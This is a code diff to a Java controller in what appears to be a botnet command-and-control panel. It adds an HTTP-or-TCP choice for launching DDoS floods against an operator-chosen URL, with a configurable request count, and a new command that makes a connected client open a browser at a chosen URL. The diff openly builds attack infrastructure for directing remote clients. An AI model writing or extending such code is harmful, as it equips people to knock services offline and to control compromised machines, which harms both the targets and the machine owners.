@@ -4,10 +4,7 @@ import br.com.core.Server;
 import br.com.model.ClientTableRow;
 import compton.AttackBuilder;
 import javafx.fxml.FXML;
-import javafx.scene.control.Alert;
-import javafx.scene.control.Label;
-import javafx.scene.control.Slider;
-import javafx.scene.control.TextField;
+import javafx.scene.control.*;
 import javafx.stage.Stage;
 import model.GenericMessage;
 
@@ -28,6 +25,11 @@ public class ClientAttackDialogController {
     @FXML
     private Slider sliderRequisitionQuantity;
 
+    @FXML
+    private RadioButton httpAttackRadio;
+    @FXML
+    private RadioButton tcpAttackRadio;
+
     private Stage mDialogStage;
     private ClientTableRow mClient;
     private Server mServer;
@@ -44,6 +46,11 @@ public class ClientAttackDialogController {
 //        } catch (IOException e) {
 //            e.printStackTrace();
 //        }
+
+        httpAttackRadio.setOnMouseClicked(e -> tcpAttackRadio.setSelected(false));
+
+        tcpAttackRadio.setOnMouseClicked(e -> httpAttackRadio.setSelected(false));
+
     }
 
     /**
@@ -81,11 +88,20 @@ public class ClientAttackDialogController {
     private void handleDDOSAttack() {
         if (isInputValidDDOS()) {
             okClicked = true;
-            GenericMessage genericMessage = AttackBuilder.buildDDOSAttack()
+
+            AttackBuilder.DDOSAttackBuilder ddosAttackBuilder = AttackBuilder.buildDDOSAttack()
                     .withUrl(TFUrl.getText())
                     .withQuantity((int) sliderRequisitionQuantity.getValue())
-                    .clientShouldSendResponse(mClient != null)
-                    .buildHTTP();
+                    .clientShouldSendResponse(mClient != null);
+
+            GenericMessage genericMessage;
+
+            if (httpAttackRadio.isSelected()) {
+                genericMessage = ddosAttackBuilder.buildHTTP();
+            } else {
+                genericMessage = ddosAttackBuilder.buildTCP();
+            }
+
             mServer.send(genericMessage, mClient);
         }
     }
@@ -101,6 +117,20 @@ public class ClientAttackDialogController {
                     .build();
 
             mServer.send(cmd, mClient);
+        }
+    }
+
+    @FXML
+    private void handleOpenUrl() {
+        if (isInputValidDDOS()) {
+            okClicked = true;
+
+            GenericMessage build = AttackBuilder.buildBrowserOpening()
+                    .withURL(TFUrl.getText())
+                    .clientShouldSendResponse(mClient != null)
+                    .build();
+
+            mServer.send(build, mClient);
         }
     }
 
